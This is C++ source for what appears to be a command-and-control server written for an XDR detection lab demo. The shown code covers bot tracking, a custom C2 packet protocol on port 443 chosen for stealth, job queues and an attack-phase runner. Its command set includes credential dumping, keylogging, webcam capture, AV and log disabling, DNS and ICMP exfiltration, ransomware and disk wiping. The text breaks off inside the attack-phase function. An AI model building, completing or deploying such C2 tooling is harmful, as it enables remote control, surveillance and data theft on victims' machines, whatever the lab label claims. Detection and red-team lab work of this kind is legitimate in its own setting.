// cnc_server.cpp : Advanced Command & Control Server for Palo Alto Networks Lab Demo
        // FOR ISOLATED LAB ENVIRONMENT ONLY - Educational/Demo Purpose
        // This will generate comprehensive XDR alerts for customer demonstrations

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <urlmon.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <atomic>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <random>
#include <algorithm>
#include <queue>
#include <condition_variable>
#include <functional>
#include <cmath>
#include <future>
#include <tuple>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Server configuration
#define C2_PORT 443          // Use HTTPS port for stealth
#define BACKUP_PORT 8443     // Fallback port
#define DNS_PORT 53          // DNS tunneling port
#define MAX_CLIENTS 10
#define BEACON_INTERVAL 10   // Rapid beaconing for demo

// Advanced configuration
#define ENABLE_ENCRYPTION true
#define ENABLE_PERSISTENCE true
#define ENABLE_EVASION true

// Global variables
std::atomic<bool> serverRunning(true);
    std::mutex logMutex;
    std::mutex clientsMutex;
    int totalCommandsSent = 0;
    std::string serverStartTime = std::to_string(std::time(nullptr));
    std::random_device rd;
    std::mt19937 gen(rd());
    std::vector<std::string> activityLog;

    // Enhanced client information
    struct ClientInfo {
        SOCKET socket;
        std::string ipAddress;
        std::string hostname;
        std::string username;
        std::string osVersion;
        std::string machineGuid;
        std::chrono::system_clock::time_point firstSeen;
        std::chrono::system_clock::time_point lastSeen;
        bool isActive;
        bool isElevated;
        int beaconCount;
        std::vector<std::string> executedCommands;
        std::map<std::string, std::string> collectedData;
        std::vector<std::string> installedPersistence;
        std::vector<std::string> queuedCommands;  // Added for command queueing
    };

    // Global map to store connected clients (must be after ClientInfo definition)
    std::map<std::string, ClientInfo> connectedClients;
    
    // Test execution tracking
    struct TestStatus {
        bool initialCompromiseComplete = false;
        bool footholdComplete = false;
        bool privEscComplete = false;
        bool defenseEvasionComplete = false;
        bool surveillanceComplete = false;
        bool discoveryComplete = false;
        bool lateralMovementComplete = false;
        bool collectionComplete = false;
        bool exfiltrationComplete = false;
        bool impactComplete = false;
        std::chrono::steady_clock::time_point startTime;
        std::chrono::steady_clock::time_point lastTestTime;
    };
    
    std::map<std::string, TestStatus> clientTestStatus;

    // Enhanced command types for comprehensive XDR triggering
    enum CommandType {
        // Basic C2
        CMD_BEACON = 0x01,
        CMD_HEARTBEAT = 0x02,

        // Reconnaissance
        CMD_SYSINFO = 0x10,
        CMD_PROCESS_LIST = 0x11,
        CMD_NETWORK_CONFIG = 0x12,
        CMD_USER_ENUM = 0x13,
        CMD_DOMAIN_INFO = 0x14,
        CMD_SOFTWARE_ENUM = 0x15,

        // Collection
        CMD_SCREENSHOT = 0x20,
        CMD_KEYLOG_START = 0x21,
        CMD_KEYLOG_DUMP = 0x22,
        CMD_CLIPBOARD = 0x23,
        CMD_BROWSER_CREDS = 0x24,
        CMD_FILE_SEARCH = 0x25,
        CMD_WEBCAM_CAPTURE = 0x26,
        CMD_MICROPHONE_RECORD = 0x27,
        CMD_SCREEN_RECORD = 0x28,

        // Execution
        CMD_SHELL_EXEC = 0x30,
        CMD_POWERSHELL = 0x31,
        CMD_INJECT_PROCESS = 0x32,
        CMD_LOAD_MODULE = 0x33,
        CMD_MIGRATE_PROCESS = 0x34,
        CMD_REVERSE_SHELL = 0x35,
        CMD_REMOTE_DESKTOP = 0x36,

        // Persistence
        CMD_INSTALL_SERVICE = 0x40,
        CMD_REGISTRY_PERSIST = 0x41,
        CMD_SCHEDULED_TASK = 0x42,
        CMD_WMI_PERSIST = 0x43,
        CMD_STARTUP_FOLDER = 0x44,
        CMD_BOOTKIT_INSTALL = 0x45,

        // Lateral Movement
        CMD_PORT_SCAN = 0x50,
        CMD_SMB_SCAN = 0x51,
        CMD_PSEXEC = 0x52,
        CMD_WMI_EXEC = 0x53,
        CMD_RDP_EXEC = 0x54,
        CMD_PASS_THE_HASH = 0x55,
        CMD_MIMIKATZ_EXEC = 0x56,

        // Privilege Escalation
        CMD_UAC_BYPASS = 0x60,
        CMD_TOKEN_STEAL = 0x61,
        CMD_EXPLOIT_SUGGESTER = 0x62,
        CMD_LSASS_DUMP = 0x63,
        CMD_SAM_DUMP = 0x64,

        // Defense Evasion
        CMD_DISABLE_AV = 0x70,
        CMD_CLEAR_LOGS = 0x71,
        CMD_TIMESTOMP = 0x72,
        CMD_PROCESS_HOLLOW = 0x73,
        CMD_ROOTKIT_INSTALL = 0x74,
        CMD_AMSI_BYPASS = 0x75,
        CMD_ETW_DISABLE = 0x76,

        // Exfiltration
        CMD_STAGE_FILES = 0x80,
        CMD_COMPRESS_DATA = 0x81,
        CMD_EXFIL_HTTP = 0x82,
        CMD_EXFIL_DNS = 0x83,
        CMD_EXFIL_ICMP = 0x84,
        CMD_EXFIL_EMAIL = 0x85,
        CMD_CLOUD_UPLOAD = 0x86,

        // Impact
        CMD_RANSOMWARE = 0x90,
        CMD_WIPE_DISK = 0x91,
        CMD_CORRUPT_BOOT = 0x92,
        CMD_CRYPTO_MINER = 0x93,
        
        // Advanced Network Evasion
        CMD_TOR_CONNECT = 0xA0,
        CMD_TOR_API_CALL = 0xA1,
        CMD_REVERSE_SSH = 0xA2,
        CMD_NETCAT_TUNNEL = 0xA3,
        CMD_SOCAT_RELAY = 0xA4,
        CMD_CRYPTCAT_TUNNEL = 0xA5
    };

    // Global command queue for coordinated attacks
    std::map<std::string, std::vector<CommandType>> clientCommandQueue;

    // Server job system
    struct ServerJob {
        std::string jobId;
        std::string clientId;
        std::string description;
        std::chrono::steady_clock::time_point startTime;
        std::function<void()> task;
        bool completed = false;
        
        // Default constructor
        ServerJob() = default;
        
        // Let compiler generate appropriate copy/move operations
        // std::function is copyable, so the struct will be too
    };

    std::queue<ServerJob> serverJobQueue;
    std::mutex serverJobQueueMutex;
    std::condition_variable serverJobCondition;
    std::vector<std::thread> serverWorkerThreads;
    std::atomic<bool> shutdownServerThreads{false};
    std::atomic<int> activeServerJobs{0};
    std::map<std::string, std::string> serverJobStatus; // jobId -> status
    const int NUM_SERVER_WORKER_THREADS = 6;

    // Forward declarations
    std::string getCommandName(CommandType cmd);
    void logActivity(const std::string& category, const std::string& type, const std::string& message);
    void executeAttackPhase(const std::string& clientId, int phase);
    void generateDNSBeacon(const std::string& serverIP, const std::string& clientIP);
    
    // Evidence management system - forward declarations
    std::string createEvidenceDirectory(const std::string& clientId, const std::string& evidenceType);
    std::string saveEvidence(const std::string& clientId, const std::string& evidenceType, 
                           const std::string& data, const std::string& fileExtension = ".txt",
                           const std::string& customFilename = "");

    // XOR encryption for C2 traffic - REMOVED FOR UNENCRYPTED COMMUNICATION
    // Function removed as server expects unencrypted data
    
    // Generate session ID for C2 tracking
    std::string generateSessionId() {
        std::stringstream ss;
        ss << std::hex << std::time(nullptr) << "-" << std::rand() % 10000;
        return ss.str();
    }
    
    // Get current time as string
    std::string getCurrentTimeString() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);
        char timeStr[100];
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);
        return std::string(timeStr);
    }
    
    // Generate random string for C2 patterns
    std::string generateRandomString(size_t length) {
        const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        std::string result;
        result.reserve(length);
        for (size_t i = 0; i < length; i++) {
            result += charset[std::rand() % (sizeof(charset) - 1)];
        }
        return result;
    }
    
    // Sanitize hostname for Windows filesystem
    std::string sanitizeHostname(const std::string& hostname) {
        std::string sanitized;
        for (char c : hostname) {
            // Keep only alphanumeric, dash, underscore, and dot
            if (std::isalnum(c) || c == '-' || c == '_' || c == '.') {
                sanitized += c;
            } else {
                sanitized += '_';  // Replace invalid chars with underscore
            }
        }
        
        // Ensure it's not empty and not too long
        if (sanitized.empty()) sanitized = "unknown";
        if (sanitized.length() > 50) sanitized = sanitized.substr(0, 50);
        
        return sanitized;
    }

    // Evidence management system implementations
    std::string createEvidenceDirectory(const std::string& clientId, const std::string& evidenceType) {
        // Extract hostname from client info
        std::string hostname = "unknown";
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (connectedClients.find(clientId) != connectedClients.end()) {
                hostname = connectedClients[clientId].hostname;
                if (hostname.empty()) hostname = clientId.substr(0, clientId.find(':'));
            } else {
                hostname = clientId.substr(0, clientId.find(':'));
            }
        }
        
        // Sanitize hostname for filesystem compatibility
        hostname = sanitizeHostname(hostname);
        
        // Create directory structure: C:\evidence\[hostname]\[evidence-type]
        std::string baseDir = "C:\\evidence\\" + hostname + "\\" + evidenceType;
        
        // Create directories recursively
        std::string currentPath = "C:";
        std::vector<std::string> pathParts = {"evidence", hostname, evidenceType};
        
        for (const auto& part : pathParts) {
            currentPath += "\\" + part;
            CreateDirectoryA(currentPath.c_str(), NULL);
        }
        
        return baseDir;
    }
    
    std::string saveEvidence(const std::string& clientId, const std::string& evidenceType, 
                           const std::string& data, const std::string& fileExtension,
                           const std::string& customFilename) {
        std::string evidenceDir = createEvidenceDirectory(clientId, evidenceType);
        
        // Generate filename
        std::string filename;
        if (!customFilename.empty()) {
            filename = customFilename;
        } else {
            auto now = std::chrono::system_clock::now();
            auto time_t = std::chrono::system_clock::to_time_t(now);
            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
            
            struct tm timeinfo;
            char timeStr[100];
            if (localtime_s(&timeinfo, &time_t) == 0) {
                strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &timeinfo);
                filename = std::string(timeStr) + "_" + std::to_string(ms.count()) + fileExtension;
            } else {
                filename = std::to_string(GetTickCount()) + fileExtension;
            }
        }
        
        std::string fullPath = evidenceDir + "\\" + filename;
        
        // Save evidence file
        std::ofstream evidenceFile(fullPath, std::ios::binary);
        if (evidenceFile.is_open()) {
            evidenceFile << data;
            evidenceFile.close();
            
            logActivity("EVIDENCE", "SAVED", evidenceType + " saved to " + fullPath);
            return fullPath;
        }
        
        logActivity("ERROR", "EVIDENCE_SAVE_FAILED", "Failed to save " + evidenceType + " to " + fullPath);
        return "";
    }

    // Server job system functions
    void initializeServerJobSystem() {
        logActivity("THREADING", "SERVER_INIT", "Initializing server job system with " + std::to_string(NUM_SERVER_WORKER_THREADS) + " worker threads");
        
        shutdownServerThreads = false;
        activeServerJobs = 0;
        
        // Start worker threads
        for (int i = 0; i < NUM_SERVER_WORKER_THREADS; ++i) {
            serverWorkerThreads.emplace_back([i]() {
                logActivity("THREADING", "SERVER_WORKER_START", "Server worker thread " + std::to_string(i) + " started");
                
                while (!shutdownServerThreads) {
                    ServerJob currentJob;
                    bool hasJob = false;
                    
                    // Wait for a job
                    {
                        std::unique_lock<std::mutex> lock(serverJobQueueMutex);
                        serverJobCondition.wait(lock, [] { return !serverJobQueue.empty() || shutdownServerThreads; });
                        
                        if (shutdownServerThreads && serverJobQueue.empty()) {
                            break;
                        }
                        
                        if (!serverJobQueue.empty()) {
                            currentJob = std::move(serverJobQueue.front());
                            serverJobQueue.pop();
                            hasJob = true;
                            
                            // Update job status
                            serverJobStatus[currentJob.jobId] = "RUNNING";
                            activeServerJobs++;
                        }
                    }
                    
                    if (hasJob) {
                        logActivity("THREADING", "SERVER_JOB_START", "Thread " + std::to_string(i) + 
                            " executing job " + currentJob.jobId + " (" + currentJob.description + ")");
                        
                        try {
                            // Execute the job
                            currentJob.task();
                            currentJob.completed = true;
                            
                            // Update job status
                            {
                                std::lock_guard<std::mutex> lock(serverJobQueueMutex);
                                serverJobStatus[currentJob.jobId] = "COMPLETED";
                            }
                            
                            auto duration = std::chrono::steady_clock::now() - currentJob.startTime;
                            auto durationMs = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
                            
                            logActivity("THREADING", "SERVER_JOB_COMPLETE", "Thread " + std::to_string(i) + 
                                " completed job " + currentJob.jobId + " in " + std::to_string(durationMs) + "ms");
                            
                        } catch (const std::exception& e) {
                            logActivity("THREADING", "SERVER_JOB_ERROR", "Thread " + std::to_string(i) + 
                                " job " + currentJob.jobId + " failed: " + e.what());
                            
                            {
                                std::lock_guard<std::mutex> lock(serverJobQueueMutex);
                                serverJobStatus[currentJob.jobId] = "FAILED";
                            }
                        } catch (...) {
                            logActivity("THREADING", "SERVER_JOB_ERROR", "Thread " + std::to_string(i) + 
                                " job " + currentJob.jobId + " failed with unknown error");
                            
                            {
                                std::lock_guard<std::mutex> lock(serverJobQueueMutex);
                                serverJobStatus[currentJob.jobId] = "FAILED";
                            }
                        }
                        
                        activeServerJobs--;
                    }
                }
                
                logActivity("THREADING", "SERVER_WORKER_END", "Server worker thread " + std::to_string(i) + " terminated");
            });
        }
        
        logActivity("THREADING", "SERVER_READY", "Server job system initialized successfully");
    }

    void shutdownServerJobSystem() {
        logActivity("THREADING", "SERVER_SHUTDOWN", "Shutting down server job system");
        
        // Signal shutdown
        shutdownServerThreads = true;
        
        // Wake up all worker threads
        serverJobCondition.notify_all();
        
        // Wait for all worker threads to finish
        for (auto& thread : serverWorkerThreads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        
        // Clear remaining jobs
        {
            std::lock_guard<std::mutex> lock(serverJobQueueMutex);
            while (!serverJobQueue.empty()) {
                serverJobQueue.pop();
            }
            serverJobStatus.clear();
        }
        
        logActivity("THREADING", "SERVER_COMPLETE", "Server job system shutdown complete");
    }

    std::string addServerJob(const std::string& clientId, const std::string& description, std::function<void()> task) {
        static std::atomic<int> jobCounter{0};
        std::string jobId = "SERVER_JOB_" + std::to_string(jobCounter++) + "_" + std::to_string(GetTickCount());
        
        {
            std::lock_guard<std::mutex> lock(serverJobQueueMutex);
            
            // Use emplace to construct the job directly in the queue
            ServerJob newJob;
            newJob.jobId = jobId;
            newJob.clientId = clientId;
            newJob.description = description;
            newJob.startTime = std::chrono::steady_clock::now();
            newJob.task = std::move(task);
            newJob.completed = false;
            
            serverJobQueue.push(std::move(newJob));
            serverJobStatus[jobId] = "QUEUED";
        }
        
        serverJobCondition.notify_one();
        
        logActivity("THREADING", "SERVER_JOB_QUEUED", "Added server job " + jobId + " for client " + clientId + 
            " (" + description + ") - Queue size: " + std::to_string(serverJobQueue.size()));
        
        return jobId;
    }

    int getActiveServerJobCount() {
        return activeServerJobs.load();
    }

    int getQueuedServerJobCount() {
        std::lock_guard<std::mutex> lock(serverJobQueueMutex);
        return static_cast<int>(serverJobQueue.size());
    }
    
    // Base64 decode function
    std::vector<unsigned char> base64Decode(const std::string& encoded) {
        const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";
        
        std::vector<unsigned char> decoded;
        int val = 0, valb = -8;
        
        for (unsigned char c : encoded) {
            if (c == '=') break;
            if (c == '\n' || c == '\r' || c == ' ') continue;
            
            auto pos = base64_chars.find(c);
            if (pos == std::string::npos) continue;
            
            val = (val << 6) + pos;
            valb += 6;
            
            if (valb >= 0) {
                decoded.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        
        return decoded;
    }

    // Enhanced logging with categories
    void logActivity(const std::string & category, const std::string & type, const std::string & message) {
        std::lock_guard<std::mutex> lock(logMutex);

        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);

        struct tm timeinfo;
        localtime_s(&timeinfo, &time_t);

        char timeStr[100];
        strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &timeinfo);

        // Console output with color coding
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

        // Enhanced color coding for better visibility
        if (category == "ATTACK") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
        }
        else if (category == "C2") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        }
        else if (category == "LATERAL") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        }
        else if (category == "COLLECTION") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        }
        else if (category == "DEFENSE_EVASION") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        }
        else if (category == "PERSISTENCE") {
            SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        }

        // Format message with clear structure
        std::cout << "[" << timeStr << "] ";
        std::cout << "[" << std::left << std::setw(15) << category << "] ";
        std::cout << "[" << std::left << std::setw(20) << type << "] ";
        std::cout << message << std::endl;

        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        
        // Store formatted entry for dashboard
        std::stringstream logEntry;
        logEntry << "[" << category << "] " << type << ": " << message;
        activityLog.push_back(logEntry.str());
        
        // Keep only last 100 entries
        if (activityLog.size() > 100) {
            activityLog.erase(activityLog.begin());
        }

        // Ensure log directory exists [[memory:7166520]]
        CreateDirectoryA("C:\\rat", NULL);
        CreateDirectoryA("C:\\rat\\logs", NULL);

        // Detailed file logging to C:\rat\logs\server.log [[memory:7166520]]
        std::ofstream logFile("C:\\rat\\logs\\server.log", std::ios::app);
        if (logFile.is_open()) {
            logFile << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
            logFile.close();
        }
        
        // Also write to old location for compatibility
        std::ofstream tempLogFile("C:\\temp\\c2_server_detailed.log", std::ios::app);
        if (tempLogFile.is_open()) {
            tempLogFile << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
            tempLogFile.close();
        }

        // Command tracking log for persistent command status
        if (category == "CMD_SENT" || category == "CMD_RESPONSE" || category == "CMD_STATUS") {
            std::ofstream cmdLog("C:\\temp\\c2_command_log.txt", std::ios::app);
            if (cmdLog.is_open()) {
                cmdLog << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
                cmdLog.close();
            }
        }
        
        // Server-side status logging for real-time monitoring
        if (category == "CMD_SENT" || category == "CMD_RESPONSE" || category == "SERVER_STATUS") {
            std::ofstream statusLog("C:\\temp\\c2_server_status.txt", std::ios::app);
            if (statusLog.is_open()) {
                statusLog << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
                statusLog.close();
            }
        }

        // Separate attack log for XDR correlation
        if (category == "ATTACK" || category == "LATERAL" || category == "EXFIL") {
            std::ofstream attackLog("C:\\temp\\attack_timeline.log", std::ios::app);
            if (attackLog.is_open()) {
                attackLog << "[" << timeStr << "] " << type << " | " << message << std::endl;
                attackLog.close();
            }
        }
    }

    // Write C2 status to file for web dashboard integration
    void writeC2StatusToFile() {
        // Create directories if they don't exist
        CreateDirectoryA("C:\\Windows\\Temp\\C2_Bots", NULL);
        
        // Count active connections
        int activeCount = 0;
        for (const auto& [id, client] : connectedClients) {
            if (client.isActive) activeCount++;
        }
        
        // Write main status file
        std::ofstream statusFile("C:\\Windows\\Temp\\C2_Status.json");
        if (statusFile.is_open()) {
            statusFile << "{\n";
            statusFile << "  \"server_status\": \"active\",\n";
            statusFile << "  \"total_bots\": " << connectedClients.size() << ",\n";
            statusFile << "  \"active_bots\": " << activeCount << ",\n";
            statusFile << "  \"total_commands\": " << totalCommandsSent << ",\n";
            statusFile << "  \"server_start_time\": \"" << serverStartTime << "\",\n";
            statusFile << "  \"last_update\": \"" << std::time(nullptr) << "\"\n";
            statusFile << "}\n";
            statusFile.close();
        }
        
        // Write individual bot files
        for (const auto& [clientId, client] : connectedClients) {
            std::string safeId = clientId;
            // Replace : with _ for filename
            size_t pos = safeId.find(':');
            if (pos != std::string::npos) {
                safeId = safeId.substr(0, pos);
            }
            
            std::string botFile = "C:\\Windows\\Temp\\C2_Bots\\" + safeId + ".json";
            std::ofstream bot(botFile);
            if (bot.is_open()) {
                // Get last seen as timestamp
                auto lastSeenTime = std::chrono::system_clock::to_time_t(client.lastSeen);
                auto connectTime = std::chrono::system_clock::to_time_t(client.firstSeen);
                
                bot << "{\n";
                bot << "  \"id\": \"" << safeId << "\",\n";
                bot << "  \"ip\": \"" << client.ipAddress << "\",\n";
                bot << "  \"hostname\": \"" << client.hostname << "\",\n";
                bot << "  \"username\": \"" << client.username << "\",\n";
                bot << "  \"os\": \"" << client.osVersion << "\",\n";
                bot << "  \"status\": \"" << (client.isActive ? "active" : "offline") << "\",\n";
                bot << "  \"elevated\": " << (client.isElevated ? "true" : "false") << ",\n";
                bot << "  \"last_seen\": " << lastSeenTime << ",\n";
                bot << "  \"connect_time\": " << connectTime << ",\n";
                bot << "  \"commands_executed\": " << client.executedCommands.size() << ",\n";
                bot << "  \"beacon_count\": " << client.beaconCount << ",\n";
                bot << "  \"guid\": \"" << client.machineGuid << "\"\n";
                bot << "}\n";
                bot.close();
            }
        }
    }

    // Enhanced command sending with proper data request
    void generateC2Traffic(SOCKET clientSocket, const std::string & clientId, CommandType cmd) {
        // Build C2 packet with realistic structure
#pragma pack(push, 1)
        struct C2Packet {
            uint32_t signature;      // 0xC2ESCAPE
            uint16_t version;         // Protocol version
            uint16_t flags;           // Encryption, compression flags
            uint32_t sessionId;       // Unique session ID
            uint16_t commandId;       // Command to execute
            uint16_t sequenceNum;     // Packet sequence
            uint32_t payloadSize;     // Size of payload
            uint32_t checksum;        // Packet checksum
        };
#pragma pack(pop)

        C2Packet packet;
        packet.signature = 0xC2E5CA9E;
        packet.version = 0x0200;  // Version 2.0
        packet.flags = 0x0011;     // Encrypted | Compressed
        packet.sessionId = std::hash<std::string>{}(clientId);
        packet.commandId = cmd;
        packet.sequenceNum = rand() % 65535;
        packet.payloadSize = 0;
        packet.checksum = 0xDEADBEEF;

        // Send clear text packet  
        std::string clearPacket = std::string((char*)&packet, sizeof(packet));
        int bytesSent = send(clientSocket, clearPacket.c_str(), clearPacket.size(), 0);

        // Log the command with enhanced tracking
        std::string cmdName = getCommandName(cmd);
        std::string commandId = "SRV_CMD_" + std::to_string(packet.sequenceNum) + "_" + std::to_string(GetTickCount());
        
        // Log command sent with tracking info
        logActivity("CMD_SENT", "COMMAND_DISPATCH", "[" + commandId + "] Command " + cmdName + " sent to " + clientId + " (" + std::to_string(bytesSent) + " bytes)");
        
        // Enhanced visibility of commands being sent
        std::cout << "\n\033[1;33m[!] SENDING COMMAND: " << cmdName << " (ID: " << cmd << ") to " << clientId << "\033[0m" << std::endl;
        
        logActivity("DEBUG", "COMMAND_PACKET_SENT", "Sent " + cmdName + " packet to " + clientId + " - Bytes: " + std::to_string(bytesSent) + " - Command ID: " + std::to_string(cmd));
        logActivity("C2", "COMMAND_SENT", "Sent " + cmdName + " to " + clientId);
        
        // Send additional text command for better client compatibility (clear text)
        std::string textCommand = "" + cmdName + ":REQUEST_DATA\n";
        int textBytesSent = send(clientSocket, textCommand.c_str(), textCommand.size(), 0);
        
        logActivity("DEBUG", "TEXT_COMMAND_SENT", "Sent text command to " + clientId + " - Command: " + textCommand + " - Bytes: " + std::to_string(textBytesSent));
        
        // Increment command counter
        totalCommandsSent++;
    }

    // Get command name for logging with comprehensive descriptions
    std::string getCommandName(CommandType cmd) {
        switch (cmd) {
        // Basic C2
        case CMD_BEACON: return "HEARTBEAT_BEACON";
        case CMD_HEARTBEAT: return "CONNECTION_HEARTBEAT";
        
        // Reconnaissance (Discovery)
        case CMD_SYSINFO: return "SYSTEM_INFO_COLLECTION";
        case CMD_PROCESS_LIST: return "PROCESS_ENUMERATION";
        case CMD_NETWORK_CONFIG: return "NETWORK_CONFIGURATION_DISCOVERY";
        case CMD_USER_ENUM: return "USER_ACCOUNT_ENUMERATION";
        case CMD_DOMAIN_INFO: return "DOMAIN_INFORMATION_GATHERING";
        case CMD_SOFTWARE_ENUM: return "SOFTWARE_DISCOVERY";
        
        // Collection
        case CMD_SCREENSHOT: return "SCREENSHOT_CAPTURE";
        case CMD_KEYLOG_START: return "KEYLOGGER_ACTIVATION";
        case CMD_KEYLOG_DUMP: return "KEYLOGGER_DATA_RETRIEVAL";
        case CMD_CLIPBOARD: return "CLIPBOARD_DATA_COLLECTION";
        case CMD_BROWSER_CREDS: return "BROWSER_CREDENTIAL_THEFT";
        case CMD_FILE_SEARCH: return "FILE_SYSTEM_SEARCH";
        case CMD_WEBCAM_CAPTURE: return "WEBCAM_SURVEILLANCE";
        case CMD_MICROPHONE_RECORD: return "AUDIO_RECORDING";
        case CMD_SCREEN_RECORD: return "SCREEN_RECORDING";
        
        // Execution
        case CMD_SHELL_EXEC: return "COMMAND_SHELL_EXECUTION";
        case CMD_POWERSHELL: return "POWERSHELL_SCRIPT_EXECUTION";
        case CMD_INJECT_PROCESS: return "MALICIOUS_PROCESS_INJECTION";
        case CMD_LOAD_MODULE: return "DYNAMIC_MODULE_LOADING";
        case CMD_MIGRATE_PROCESS: return "PROCESS_MIGRATION";
        case CMD_REVERSE_SHELL: return "REVERSE_SHELL_CONNECTION";
        case CMD_REMOTE_DESKTOP: return "REMOTE_DESKTOP_ACCESS";
        
        // Persistence
        case CMD_INSTALL_SERVICE: return "MALICIOUS_SERVICE_INSTALLATION";
        case CMD_REGISTRY_PERSIST: return "REGISTRY_PERSISTENCE_MECHANISM";
        case CMD_SCHEDULED_TASK: return "SCHEDULED_TASK_PERSISTENCE";
        case CMD_WMI_PERSIST: return "WMI_EVENT_PERSISTENCE";
        case CMD_STARTUP_FOLDER: return "STARTUP_FOLDER_PERSISTENCE";
        case CMD_BOOTKIT_INSTALL: return "BOOTKIT_INSTALLATION";
        
        // Lateral Movement
        case CMD_PORT_SCAN: return "NETWORK_PORT_SCANNING";
        case CMD_SMB_SCAN: return "SMB_SHARE_ENUMERATION";
        case CMD_PSEXEC: return "PSEXEC_LATERAL_MOVEMENT";
        case CMD_WMI_EXEC: return "WMI_REMOTE_EXECUTION";
        case CMD_RDP_EXEC: return "RDP_LATERAL_MOVEMENT";
        case CMD_PASS_THE_HASH: return "PASS_THE_HASH_ATTACK";
        case CMD_MIMIKATZ_EXEC: return "MIMIKATZ_CREDENTIAL_DUMP";
        
        // Privilege Escalation
        case CMD_UAC_BYPASS: return "UAC_BYPASS_EXPLOITATION";
        case CMD_TOKEN_STEAL: return "ACCESS_TOKEN_THEFT";
        case CMD_EXPLOIT_SUGGESTER: return "PRIVILEGE_ESCALATION_ENUMERATION";
        case CMD_LSASS_DUMP: return "LSASS_MEMORY_DUMP";
        case CMD_SAM_DUMP: return "SAM_DATABASE_EXTRACTION";
        
        // Defense Evasion
        case CMD_DISABLE_AV: return "ANTIVIRUS_DISABLING";
        case CMD_CLEAR_LOGS: return "EVENT_LOG_CLEARING";
        case CMD_TIMESTOMP: return "FILE_TIMESTAMP_MANIPULATION";
        case CMD_PROCESS_HOLLOW: return "PROCESS_HOLLOWING_INJECTION";
        case CMD_ROOTKIT_INSTALL: return "ROOTKIT_INSTALLATION";
        case CMD_AMSI_BYPASS: return "AMSI_BYPASS_TECHNIQUE";
        case CMD_ETW_DISABLE: return "ETW_LOGGING_DISABLING";
        
        // Exfiltration
        case CMD_STAGE_FILES: return "DATA_STAGING_FOR_EXFILTRATION";
        case CMD_COMPRESS_DATA: return "DATA_COMPRESSION";
        case CMD_EXFIL_HTTP: return "HTTP_DATA_EXFILTRATION";
        case CMD_EXFIL_DNS: return "DNS_TUNNEL_EXFILTRATION";
        case CMD_EXFIL_ICMP: return "ICMP_TUNNEL_EXFILTRATION";
        case CMD_EXFIL_EMAIL: return "EMAIL_DATA_EXFILTRATION";
        case CMD_CLOUD_UPLOAD: return "CLOUD_SERVICE_UPLOAD";
        
        // Impact
        case CMD_RANSOMWARE: return "RANSOMWARE_DEPLOYMENT";
        case CMD_WIPE_DISK: return "DISK_WIPING_ATTACK";
        case CMD_CORRUPT_BOOT: return "BOOT_SECTOR_CORRUPTION";
        case CMD_CRYPTO_MINER: return "CRYPTOCURRENCY_MINING";
        
        // Advanced Network Evasion
        case CMD_TOR_CONNECT: return "TOR_NETWORK_CONNECTION";
        case CMD_TOR_API_CALL: return "TOR_API_COMMUNICATION";
        case CMD_REVERSE_SSH: return "REVERSE_SSH_TUNNEL";
        case CMD_NETCAT_TUNNEL: return "NETCAT_NETWORK_TUNNEL";
        case CMD_SOCAT_RELAY: return "SOCAT_NETWORK_RELAY";
        case CMD_CRYPTCAT_TUNNEL: return "CRYPTCAT_ENCRYPTED_TUNNEL";
        
        default: return "UNKNOWN_COMMAND_" + std::to_string(cmd);
        }
    }

    // Execute attack campaign phases
    void executeAttackPhase(const std::string & clientId, int phase) {
        std::vector<CommandType> phaseCommands;
        std::string phaseName;
        std::string phaseDescription;

        switch (phase) {
        case 0: // Initial Compromise
            phaseCommands = { CMD_BEACON, CMD_SYSINFO, CMD_PROCESS_LIST, CMD_NETWORK_CONFIG };
            phaseName = "INITIAL_COMPROMISE";
            phaseDescription = "Gathering system information and establishing initial foothold";
            logActivity("ATTACK", phaseName, "=== PHASE 0: " + phaseDescription + " on " + clientId + " ===");
